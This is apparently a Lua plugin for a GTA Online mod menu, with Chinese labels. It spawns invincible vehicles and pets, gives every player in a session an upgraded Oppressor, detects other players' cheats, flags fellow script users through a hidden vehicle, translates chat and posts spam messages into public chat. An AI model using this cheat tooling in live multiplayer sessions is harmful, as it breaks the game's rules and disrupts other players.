    jingche = menu.list(funfeatures, "警车选项", {}, "加载警车", function(); end)
    jiazaijingche = menu.action(jingche, "加载警车选项", {""}, "", function()
        notification("正在加载警车脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.GTlib.jingche"
        menu.delete(jiazaijingche)
    end)

    Blackhole = menu.list(funfeatures, "黑洞", {}, "加载黑洞", function(); end)
    Load_Blackhole = menu.action(Blackhole, "加载黑洞选项", {""}, "", function()
            notification("正在加载黑洞脚本,请稍等",colors.red)
            util.yield(2000)
            require "lib.GTlib.Blackhole"
            menu.delete(Load_Blackhole)
    end)
    local num = {
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "10",
    "11",
    "12",
    "13",
    "14",
    "15",
    "16",
    "17",
    "18",
    "19",
    "20",
    "21",
    "22",
    "23",
    "24",
    "25",
    "26",
    "27",
    "28",
    "29",
    "30",
    "31",
    "32",
    "33",
    "34",
    "35"
}
    
    menu.toggle(funfeatures, "特斯拉自动驾驶", {}, "", function(toggled)
            local player = players.user_ped()
            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
            local tesla_ai = util.joaat("u_m_y_baygor")
            local tesla = util.joaat("raiden")
            request_model(tesla_ai)
            request_model(tesla)
            if toggled then     
                if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
                    menu.trigger_commands("deletevehicle")
                end
        
                tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
                tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
                ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true)
                ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
                PED.SET_PED_INTO_VEHICLE(player, tesla_vehicle, -2)
                PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
                PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
                VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
                VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
                VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
                VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
                menu.trigger_commands("performance")
        
                if HUD.IS_WAYPOINT_ACTIVE() then
                    local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
                    TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20, 786603, 0)
                else
                    TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20, 786603)
                end
            else
                if tesla_ai_ped ~= nil then 
                    entities.delete_by_handle(tesla_ai_ped)
                end
                if tesla_vehicle ~= nil then 
                    entities.delete_by_handle(tesla_vehicle)
                end
            end
    end)

function upgrade_vehicle(vehicle) -- lancescript
    for i = 0, 49 do
        local num = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)
        VEHICLE.SET_VEHICLE_MOD(vehicle, i, num - 1, true)
    end
end
function give_oppressor(pid)
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, 5.0, 0.0)

    local hash = util.joaat("oppressor2")

    if not STREAMING.HAS_MODEL_LOADED(hash) then
        load_model(hash)
    end

    local oppressor = entities.create_vehicle(hash, c, ENTITY.GET_ENTITY_HEADING(ped))
    ENTITY.SET_ENTITY_INVINCIBLE(oppressor)

    upgrade_vehicle(oppressor)
end
    menu.action(funfeatures, "给他爱", {"oppressorparty"}, "每人一辆mk2", function ()
        chat.send_message("已到位", false, true, true)
        for k,v in pairs(players.list(true, true, true)) do
            give_oppressor(v)
            util.yield()
        end
    end)

menu.action(funfeatures, "飞天扫帚", {""}, "注意:您将对其他玩家不可见.", function()
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped(), false)
    local broomstick = util.joaat("prop_tool_broom")
    local oppressor = util.joaat("oppressor2")
    request_model(broomstick)
    request_model(oppressor)
    obj = entities.create_object(broomstick, pos)
    veh = entities.create_vehicle(oppressor, pos, 0)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, false)
    PED.SET_PED_INTO_VEHICLE(players.user_ped(), veh, -1)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, veh, 0, 0, 0, 0.3, -80.0, 0, 0, true, false, false, false, 0, true) -- thanks to chaos mod for doing the annoying rotation work for me :P
end)

headlamp = menu.list(funfeatures, "头灯", {}, "别人看不到的本地娱乐功能.")
distance = 25.0
menu.slider_float(headlamp, "距离", {"distance"}, "光照距离.", 100, 10000, 1500, 100, function(value)
    distance = value / 100
end)

brightness = 10.0
menu.slider_float(headlamp, "亮度", {"brightness"}, "光亮强度.", 100, 10000, 1000, 100, function(value)
    brightness = value / 100
end)

radius = 15.0
menu.slider_float(headlamp, "半径", {"radius"}, "光束半径.", 100, 5000, 2000, 100, function(value)
    radius = value / 100
end)

color = {r = 1, g = 235/255, b = 190/255, a = 0}
menu.colour(headlamp, "颜色", {"colour"}, "", color, true, function(value)
    color = value 
end)

menu.toggle_loop(headlamp, "开启", {"headlamp"}, "", function()
    local head_pos = PED.GET_PED_BONE_COORDS(players.user_ped(), 31086, 0.0, 0.0, 0.0)
    local cam_rot = players.get_cam_rot(players.user())
    GRAPHICS.DRAW_SPOT_LIGHT(head_pos, cam_rot:toDir(), math.floor(color.r * 255), math.floor(color.g * 255), math.floor(color.b * 255), distance * 1.5, brightness, 0.0, radius, distance)
end)
    
local jinx_pet
jinx_toggle = menu.toggle_loop(funfeatures, "宠物猫Jinx", {}, "招一只可爱的小猫咪\n跟着你喵喵叫\n好可爱我好喜欢！", function()
    if not jinx_pet or not ENTITY.DOES_ENTITY_EXIST(jinx_pet) then
        local jinx = util.joaat("a_c_cat_01")
        request_model(jinx)
        local pos = players.get_position(players.user())
        jinx_pet = entities.create_ped(28, jinx, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(jinx_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(jinx_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(jinx_pet)
    jinx_pet = nil
end)
    
local jinx_army = {}
local army = menu.list(funfeatures, "宠物猫Jinx军队", {}, "哈哈哈，招一堆傻猫\n叫的你头疼，甩都甩不掉")
menu.click_slider(army, "生成数量", {}, "选吧，多生成点，最多256只", 1, 256, 30, 1, function(val)
    local ped = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    pos.y = pos.y - 5
    pos.z = pos.z + 1
    local jinx = util.joaat("a_c_cat_01")
    request_model(jinx)
     for i = 1, val do
        jinx_army[i] = entities.create_ped(28, jinx, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jinx_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(jinx_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        util.yield()
     end 
end)

menu.action(army, "清除宠物猫Jinx", {}, "把这烦人的傻猫都给他们清了", function()
    for i, ped in ipairs(entities.get_all_peds_as_handles()) do
        if PED.IS_PED_MODEL(ped, util.joaat("a_c_cat_01")) then
            entities.delete_by_handle(ped)
        end
    end
end)
    
menu.action(funfeatures, "找到Jinx", {}, "\n将Jinx猫传送到你身边\n老叫傻猫来干嘛?\n", function()
    local ped = players.user_ped()
    local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
    if jinx_pet ~= nil then 
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jinx_pet, pos, false, false, false)
    else
        util.toast("找不到你那只傻猫了. :/")
    end
end)

do_vpn_warn = false
menu.toggle(detection, "没有VPN检测", {}, "检测是否有VPN.", function(on)
    do_vpn_warn = on
end, false)

detection_teleports = false
menu.toggle(detection, "传送/修改速度", {}, "检测不准，但是在差事就检测的非常准了..", function(on)
    detection_teleports = on
end)

        menu.toggle_loop(detection, "玩家无敌检测", {}, "检测是否在使用无敌.", function()
        god_detection()
        end)
        
        menu.toggle_loop(detection, "车辆无敌检测", {}, "检测载具是否在使用无敌.", function()
        cargod_detection()
        end)

        menu.toggle_loop(detection, "未发布载具检测", {}, "检测是否有人在驾使尚未发布的车辆.", function()
        unreleased_car_detection()
            end)

        menu.toggle_loop(detection, "无法获得武器检测", {}, "检测是否有人使用无法在线获得的武器.", function()
        cantgetweapon_detection()
        end)

        menu.toggle_loop(detection, "无法获得载具检测", {}, "检测是否有人正在使用无法在线获得的车辆.", function()
        cantgetvar_detection()
        end)
          
        menu.toggle_loop(detection, "室内使用武器检测", {}, "检测玩家是否在室内使用武器.", function()
        usingweapon_detection()
        end)

        menu.toggle_loop(detection, "超级驾驶检测", {}, "检测是否有在修改载具车速.", function()
        supercar_detection()
        end)
 
        menu.toggle_loop(detection, "超级跑检测", {}, "检测玩家是否在使用超级跑（奔跑速度不合常理）", function()
        superrun_detection()
        end)

        menu.toggle_loop(detection, "自由镜头检测", {}, "检测是否有人开启自由镜头（又称无碰撞）", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_ptr = entities.handle_to_pointer(ped)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local oldpos = players.get_position(pid)
        util.yield()
        local currentpos = players.get_position(pid)
        local vel = ENTITY.GET_ENTITY_VELOCITY(ped)
        if not util.is_session_transition_active() and players.exists(pid)
        and get_interior_player_is_in(pid) == 0 and get_spawn_state(pid) ~= 0
        and not PED.IS_PED_IN_ANY_VEHICLE(ped, false) -- too many false positives occured when players where driving. so fuck them. lol.
        and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_DEAD_OR_DYING(ped)
        and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped) and not PED.IS_PED_USING_SCENARIO(ped)
        and not TASK.GET_IS_TASK_ACTIVE(ped, 160) and not TASK.GET_IS_TASK_ACTIVE(ped, 2)
        and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) <= 395.0 -- 400 was causing false positives
        and ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(ped) > 5.0 and not ENTITY.IS_ENTITY_IN_AIR(ped) and entities.player_info_get_game_state(ped_ptr) == 0
        and oldpos.x ~= currentpos.x and oldpos.y ~= currentpos.y and oldpos.z ~= currentpos.z 
        and vel.x == 0.0 and vel.y == 0.0 and vel.z == 0.0 then
            util.toast(players.get_name(pid) .. " 是无碰撞")
            break
        end
    end
end)

        menu.toggle_loop(detection, "观看检测", {}, "检测是否有人在观看你.", function()
        lookingyou_detection()
        end)

        menu.toggle_loop(detection, "传送检测", {}, "检测玩家是否使用了传送", function()
        tp_detection()
        end)

        menu.toggle_loop(detection, '天基炮检测', {'JSorbDetection'}, '当有人开始使用天基炮的时候告诉您.', function()
        orbdection()
        end)

        menu.toggle_loop(detection, "雷霆加入检测", {}, "检测是否有玩家使用了雷霆加入.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        if not util.is_session_transition_active() and get_spawn_state(pid) == 0 and players.get_script_host() == pid  then
            util.toast(players.get_name(pid) .. " 触发了检测(雷霆加入),现在已被归类为作弊者")
        end
    end
end)

user_options = menu.list(detection, "检测用户")
mmtluascriptchatsession = false
menu.toggle(user_options,"检测之后发送聊天", {}, "", function(on)
    mmtluascriptchatsession = on

end)
v3_2t1 = function (x, y, z)
	x = x or 0.0
	y = y or 0.0
	z = z or 0.0
	local vec =
	{	x = x, y = y or x, z = z or x,

		magnitude = function (self, other)
			local end_vec = other and (self - other) or self
			return math.sqrt(end_vec.x^2 + end_vec.y^2 + end_vec.z^2)
		end,
		transformRotToDir = function(self, deg_z, deg_x)
			local rad_z = deg_z * math.pi / 180;
			local rad_x = deg_x * math.pi / 180;
			local num = math.abs(math.cos(rad_x));
			self.x = -math.sin(rad_z) * num
			self.y = math.cos(rad_z) * num
			self.z = math.sin(rad_x)
		end,
		degToRad = function (self)
			self.x = self.x * math.pi / 180
			self.y = self.y * math.pi / 180
			self.z = self.z * math.pi / 180
		end,
		radToDeg = function (self)
			self.x = self.x * 180 / math.pi
			self.y = self.y * 180 / math.pi
			self.z = self.z * 180 / math.pi
		end
	}
	setmetatable(vec, v3_meta)
	return vec
end
set_entity_coords_no_offset_2t1 = function (ent, pos)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(ent, pos.x, pos.y, pos.z)
    return true
end
create_vehicle_2t1 = function (hash, pos, heading, networked, alwaysFalse)
    local veh = entities.create_vehicle(hash, pos, heading)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(veh, true)
    return veh
end
function spawn_vehicle(hash, coords, dir, maxed, god)
    request_model_load(hash)
    if maxed then	
        set_entity_coords_no_offset_2t1(car, coords)
        ENTITY.SET_ENTITY_HEADING(car, dir)
        if god then
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return car
    else
        local car = create_vehicle_2t1(hash, coords, dir, true, false)
        if god then
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
        return car
    end
end
menu.action(user_options,"设置为Lua用户", {""}, "切换战局需要重新设置,按一次就够了", function(m)
    pos = v3_2t1(0, 0, 0)
    dune = spawn_vehicle(534258863, pos, 0)
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    pos.z = pos.z - players.user()
    set_entity_coords_no_offset_2t1(dune, pos)
end)
function int_to_uint(int)
	if int >= 0 then
		return int
	end
	return (1 << 32) + int
end
send_player_sms_2t1 = function (pid, message)
    menu.trigger_commands("smstext"..players.get_name(pid).." "..message)
    menu.trigger_commands("smssend"..players.get_name(pid))
end
--chat.send_message(PLAYER.GET_PLAYER_NAME(pid)..'  666 ',false,true,true)
menu.action(user_options,"检测用户", {},"", function()
    oldpos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    ENTITY.GET_ENTITY_COORDS(players.user_ped(), 0, 0, 0)
    util.yield(500)
    set_entity_coords_no_offset_2t1(players.user_ped(), oldpos)
    allvehs = entities.get_all_vehicles_as_handles()
    for i = 1, #allvehs do
      vehhash = int_to_uint(ENTITY.GET_ENTITY_MODEL(allvehs[i]))
      if vehhash == 534258863 then
        pos = ENTITY.GET_ENTITY_COORDS(allvehs[i])
        if 0 == pos.x and 0 == pos.y then
          print(tostring(pos.z))
          nopid = 0 - pos.z
          pid = math.floor(nopid)
          if mmtluascriptchatsession then
            if pid ~= players.user() then
              mmmtuser = players.get_name(pid)
              chat.send_message("检测到用户["..mmmtuser.."]", false,true, true)
              notification("检测到用户"..mmmtuser)
            end
          elseif pid ~= players.user() then
            print(pid)
            mmmtuser = players.get_name(pid)
            send_player_sms_2t1(pid, "~h~[~f~"..mmmtuser.."~q~]")
            notification("检测到用户"..mmmtuser)
          end
        end
        util.yield(1)
      end
      util.yield(1)
    end
end)

util.ensure_package_is_installed("lua/GTlib/ScaleformLib")
local sfchat = require("lib.GTlib.ScaleformLib")("multiplayer_chat")
sfchat:draw_fullscreen()
focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")

local Languages = {
	{ Name = "Afrikaans", Key = "af" },
	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "English", Key = "en" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}


LangKeys = {}
LangName = {}
LangIndexes = {}
LangLookupByName = {}
LangLookupByKey = {}
PlayerSpooflist = {}
PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function encode(text)
	return string.gsub(text, "%s", "+")
end
function decode(text)
	return string.gsub(text, "%+", " ")
end

local chat_translation = menu.list(GPB, "聊天翻译")

settingtrad = menu.list(chat_translation, "翻译设置")
colortradtrad = menu.list(settingtrad, "玩家名称颜色")
menu.on_focus(colortradtrad, function()
	util.yield(50)
	isfocused = false
end)
selectmenu = menu.action(colortradtrad, "已选择 : ".."Color : "..colorselec, {}, "这将保存到配置文件中", function()
	menu.focus(focusref[tonumber(colorselec)])
end)
menu.on_focus(selectmenu, function()
	util.yield(50)
	isfocused = false
end)
for i = 1, 234 do
	focusref[i] = menu.action(colortradtrad, "Color : "..i, {}, "这将保存到配置文件中", function() 
		menu.set_menu_name(selectmenu, "已选择 : ".."Color : "..i)
		colorselec = i
	end)
	menu.on_focus(focusref[i], function()
		isfocused = false
		util.yield(50)
		isfocused = true
		while isfocused do
			if not menu.is_open() then
				isfocused = false
			end
			ptr1 = memory.alloc()
			ptr2 = memory.alloc()
			ptr3 = memory.alloc()
			ptr4 = memory.alloc()
			HUD.GET_HUD_COLOUR(i, ptr1, ptr2, ptr3, ptr4)
			directx.draw_text(0.5, 0.5, "exemple", 5, 0.75, {r = memory.read_int(ptr1)/255, g = memory.read_int(ptr2)/255, b =memory.read_int(ptr3)/255, a= memory.read_int(ptr4)/255}, true)
			util.yield()
		end
	end)
end

menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] 翻译消息", {"labelteam"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "自定义标签 ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] 翻译消息", {"labelall"}, "将其留空将恢复为原始标签", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangmenu = menu.slider_text(chat_translation, "目标语言", {}, "您需要单击以应用更改", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocamenu = menu.slider_text(settingtrad, "翻译信息的位置", {}, "您需要单击以应用更改", {"团队聊天不联网", "团队聊天", "全局聊天不联网", "全局聊天", "通知"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "翻译自己", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "即使语言与所需语言相同,也进行翻译", {}, "可能不会正常工作,因为谷歌是个傻瓜", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "使用旧方法", {}, players.get_name(players.user()).." [全部]玩家:信息", function(on)
	oldway = on	
end)
traduct = true
menu.toggle(chat_translation, "翻译", {"fanyi"}, "", function(on)
	traduct = on	
end, true)
menu.trigger_commands("fanyi off")
traductmymessage = menu.list(chat_translation, "发送翻译信息")
finallangmenu = menu.slider_text(traductmymessage, "最终语言", {"finallang"}, "翻译成最终语言.您需要单击以应用更改", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "发送信息", {"Sendmessage"}, "输入消息的文本", function(on_click)
    util.toast("请输入您的消息")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
			translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
			for _, pId in ipairs(players.list()) do
				chat.send_targeted_message(pId, players.user(), string.gsub(translation, "%+", " "), false)
			end
		end
	end)
    async_http.dispatch()
end)
botsend = false
chat.on_message(function(packet_sender, message_sender, text, team_chat)
	if not botsend then
		if not traductself and (packet_sender == players.user()) then
		else
			if traduct then
				async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlang.."&dt=t&q="..encode(text), function(Sucess)
					if Sucess ~= "" then
						translation, original, sourceLang = Sucess:match("^%[%[%[\"(.-)\",\"(.-)\",.-,.-,.-]],.-,\"(.-)\"")
						if not traductsamelang and (sourceLang == targetlang)then
						
						else
							if oldway then
								sender = players.get_name(players.user())
								translationtext = players.get_name(packet_sender).." : "..decode(translation)
								colorfinal = 1
							else
								sender = players.get_name(packet_sender)
								translationtext = decode(translation)
								colorfinal = colorselec
							end
							if (Tradloca == 1) then						
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 2) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), true, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, teamchatlabel, false, colorfinal)
							end if (Tradloca == 3) then
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 4) then
								botsend = true
								chat.send_message(players.get_name(packet_sender).." : "..decode(translation), false, false, true)
								sfchat.ADD_MESSAGE(sender, translationtext, allchatlabel, false, colorfinal)
							end if (Tradloca == 5) then
								util.toast(players.get_name(packet_sender).." : "..decode(translation), TOAST_ALL)
							end
						end
					end
				end)
				async_http.dispatch()
			end
		end
	end
	botsend = false
end)


run = 0
while run<10 do 
	Tradloca = menu.get_value(tradlocamenu)
	targetlangmessagesend = LangLookupByName[LangKeys[menu.get_value(finallangmenu)]]
	targetlang = LangLookupByName[LangKeys[menu.get_value(targetlangmenu)]]
	util.yield()
	run = run+1
end
    
    chatspamtrash = menu.list(GPB, "刷屏")

    menu.action(chatspamtrash, "作死", {""}, "", function()
    chat.send_message("U CANT CRASH 2stand1 HomerLuaScript USER XD",false,true,true)
    end)
    menu.action(chatspamtrash, "踢出广告", {""}, "", function()
     chat.send_message("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n---------------\n已为您自动踢出广告机\n----------OvO----------",false,true,true)
    end)
    menu.action(chatspamtrash, "ikun", {""}, "", function()
    chat.send_message("故人西辞黄鹤楼,唱跳Rap打篮球\n 春风又绿江南岸,练习长达两年半\n清明时节雨坤坤,路上行人梳中分\n借问背带何处有,牧童遥指练习生",false,true,true)
    end)

menu.toggle(chatspamtrash, "关闭公屏聊天", {}, "当你在上面写“图标”的时候，它就不会出来了", function()
	if on then
		menu.trigger_commands("hidetyping on")
	else
		menu.trigger_commands("hidetyping off")
	end
end)

menu.divider(sc, "载具")

menu.action(sc, "搜索载具模组", {"lssearchv"}, "", function(click_type)
    menu.show_command_box("lssearchv" .. " ")
    end, function(on_command)
        local results = search_vehicle(on_command)
        if #results == 0 then 
            util.toast("无搜索结果 :(")
        else
            menu.set_list_action_options(v_search_results_action, results)
            menu.trigger_commands("lsvsearchresults")
        end
end)

load_vehicle_action = menu.list_action(sc, "加载模组载具", {}, "加载载具. " .. instruction_text, all_vehicles, function(index, value)
    local path = vehicles_dir .. '\\' .. value
    if util.is_key_down(0x10) and util.is_key_down(0x11) then
        os.remove(path)
        util.toast(value .. " 已删除! :)")
        get_all_vehicles_in_dir()
    elseif util.is_key_down(0x20) then 
        favorite_vehicle(value)
    else
        load_vehicle(vehicles_dir .. '\\' .. value)
    end
end)

loaded_vehicles_root = menu.list(sc, "已加载的载具", {"lancespoonerloadedvehicles"}, "你已经加载的载具")

menu.divider(sc, "地图")
menu.action(sc, "搜索地图模组", {"lssearchmap"}, "", function(click_type)
    menu.show_command_box("lssearchmap" .. " ")
    end, function(on_command)
        local results = search_map(on_command)
        if #results == 0 then 
            util.toast("无搜索结果 :(")
        else
            menu.set_list_action_options(m_search_results_action, results)
            menu.trigger_commands("lsmsearchresults")
        end
end)

load_map_action = menu.list_action(sc, "加载XML地图", {}, "加载地图. " .. instruction_text, all_maps, function(index, value)
    local path = maps_dir .. '\\' .. value
    if util.is_key_down(0x10) and util.is_key_down(0x11) then
        os.remove(path)
        util.toast(value .. " 已删除! :)")
        get_all_maps_in_dir()
    elseif util.is_key_down(0x20) then 
        favorite_map(value)
    else
        load_map(path)
    end
end)
loaded_maps_root = menu.list(sc, "已加载的地图", {"lancespoonerloadedmaps"}, "你已经加载的地图")


menu.divider(sc, "收藏夹")

local load_favorite_vehicle_action = menu.list_action(sc, "最爱的载具", {}, "加载载具.", favorite_vehicles, function(index, value)
    load_vehicle(vehicles_dir .. '\\' .. value)
end)

local load_favorite_map_action = menu.list_action(sc, "最爱的地图", {}, "加载地图.", favorite_maps, function(index, value)
    load_map(maps_dir .. '\\' .. value)
end)


menu.divider(sc, "杂项")
v_search_results = {}
v_search_results_action = menu.list_action(sc, "载具搜索结果", {"lsvsearchresults"}, "", v_search_results, function(index, value)
    local path = vehicles_dir .. '\\' .. value
    load_vehicle(path)
end)

m_search_results = {}
m_search_results_action = menu.list_action(sc, "地图搜索结果", {"lsmsearchresults"}, "", m_search_results, function(index, value)
    local path = maps_dir .. '\\' .. value
    menyoo_load_map(path)
end)

function get_all_maps_in_dir()
    local temp_maps = {}
    local temp_favorite_maps = {}
    for i, path in ipairs(filesystem.list_files(maps_dir)) do
        if string.match(path:gsub(maps_dir, ''), '.xml') then
            temp_maps[#temp_maps + 1] = path:gsub(maps_dir, '')
            if string.startswith(path:gsub(maps_dir, ''), '[F]') then 
                temp_favorite_maps[#temp_favorite_maps+1] = path:gsub(maps_dir, '')
            end
        end
    end


    all_maps = temp_maps
    favorite_maps = temp_favorite_maps
    menu.set_list_action_options(load_map_action, all_maps)
    menu.set_list_action_options(load_favorite_map_action, favorite_maps)
end

function get_all_vehicles_in_dir()
    local temp_vehicles = {}
    local temp_favorite_vehicles = {}
    local temp_favorite_maps = {}
    local supported_formats = {'.xml', '.ini', '.json'}
    for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
        for _, fmt in pairs(supported_formats) do 
            if string.match(path:gsub(vehicles_dir, ''), fmt) then
                temp_vehicles[#temp_vehicles + 1] = path:gsub(vehicles_dir, '')
                if string.startswith(path:gsub(vehicles_dir, ''), '[F]') then 
                    temp_favorite_vehicles[#temp_favorite_vehicles+1] = path:gsub(vehicles_dir, '')
                end
            end
        end
    end

    all_vehicles = temp_vehicles
    favorite_vehicles = temp_favorite_vehicles
